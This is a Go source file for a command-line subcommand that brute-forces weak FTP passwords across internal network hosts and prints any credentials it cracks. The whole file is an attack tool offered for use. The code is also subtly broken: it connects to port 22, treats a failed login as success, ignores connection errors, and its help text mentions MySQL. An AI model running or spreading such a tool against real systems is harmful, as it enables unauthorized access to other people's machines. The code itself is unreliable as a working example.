package cmd

import (
	"demo/cmd/config"
	"demo/pkg/logger"
	"fmt"
	"github.com/dutchcoders/goftp"
	"github.com/spf13/cobra"
	"log"

)

var ftpCmd = &cobra.Command{
	Use:   "ftp",
	Short: "对内网主机进行ftp弱口令爆破",
	Run: func(cmd *cobra.Command, args []string) {
		if Hosts == "" {
			_ = cmd.Help()
		} else {
			Choice()
			username := config.Userdict["ftp"]
			password := config.Passwords
			fmt.Println(username)
			fmt.Println(password)
			for _, user := range username {                              //先是以password遍历ip，然后以user遍历password
				for _, password := range password {
					for _, ip := range SurvivalHost {
						success := FtpConn(user,password,ip)
						if success == true {                           //判断是否是成功 如果成功则 高亮 true
							log.Println(logger.LightGreen(ip+" "+user+" "+password+" "+logger.LightGreen(success)))
						}else {
							log.Println(ip, user, password, success)
						}
						if success {
							c:=fmt.Sprintf("ftp弱口令 破解%v成功，用户名是%v,密码是%v\n", ip, user, password)
							fmt.Println(logger.LightBlue(c))
						}
					}
				}
			}
		}
	},
}


func FtpConn(user string, pass string,ip string) bool {
	var flag = false
	ipport := fmt.Sprintf("%s"+":22",ip)
	fmt.Println(ipport)
	ftp,_ := goftp.Connect(ipport)
	a := ftp.Login(user, pass)
	ftp.Pwd()
	if a != nil{
		flag = true
	}else {
		flag = false
	}
	return flag
}
func init() {
	rootCmd.AddCommand(ftpCmd)
	ftpCmd.Flags().StringVarP(&Hosts, "hosts", "H", "", "设置你要扫描的mysql弱口令主机")
}